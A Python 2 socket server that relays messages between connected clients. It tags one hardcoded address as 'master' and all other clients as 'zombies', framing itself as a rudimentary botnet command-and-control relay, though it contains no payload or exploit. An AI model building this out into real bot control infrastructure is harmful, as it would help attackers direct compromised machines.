import socket
import thread

class SocketServer(socket.socket):
    clients = []

    def __init__(self):
        socket.socket.__init__(self)
        #To silence- address occupied!!
        self.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.bind(('127.0.0.1', 4545))
        self.listen(5)

    def run(self):
        print "Server started"
        try:
            self.accept_clients()
        except Exception as ex:
            print ex
        finally:
            print "Server closed"
            for client,role in self.clients:
                client.close()
            self.close()

    def accept_clients(self):
        while 1:
            (clientsocket, address) = self.accept()
            #Adding client to clients list
            if address[0] == "192.168.25.3":
                role = "master"
            else:
                role = "zombie"

            self.clients.append(tuple((clientsocket,role)))
            #Client Connected
            self.onopen(clientsocket,address,role)
            #Receiving data from client
            thread.start_new_thread(self.recieve, (clientsocket,))

    def recieve(self, client):
        while 1:
            data = client.recv(1024)
            data2 = data.rstrip()
            if data2 == "list":
                self.listzombies()
            if data2 == "die":
                break
            #Message Received
            self.onmessage(client, data)
        #Removing client from clients list
        for i in self.clients:
            if i[0] == client:
                rmrole = i[1]
                self.clients.remove(i)
        #self.clients.remove((client,role))
        #Client Disconnected
        self.onclose(client,client.getsockname(),rmrole)
        #Closing connection with client
        client.close()
        #Closing thread
        thread.exit()
        print self.clients

    def broadcast(self, message):
        #Sending message to all clients
        for client,role in self.clients:
            client.send(message)

    def multicast(self,message,sender):
        #Sending message to all clients but sender
        for client,role in self.clients:
            if client != sender:
                client.send(message)

    def listzombies(self):
        pass

    def onopen(self, client, address, role):
        pass

    def onmessage(self, client, message):
        pass

    def onclose(self, client, address, role):
        pass



class BasicChatServer(SocketServer):

    def __init__(self):
        SocketServer.__init__(self)

    def onmessage(self, client, message):
        print "Client Sent Message"
        #Sending message to all clients
        self.multicast(message, client)

    def onopen(self, client, address, role):
        print role.capitalize() + " Connected = " + str(address)

    def onclose(self, client, address, role):
        print role.capitalize() + " Disconnected = " + str(address)

    def listzombies(self):
        #List all clients currently connected
        i = 0
        for client,role in self.clients:
            if role == "zombie":
                print "Zombie #" + str(i) + " - at " + client.getsockname()[0]
            i += 1

def main():
    server = BasicChatServer()
    server.run()

if __name__ == "__main__":
    main()
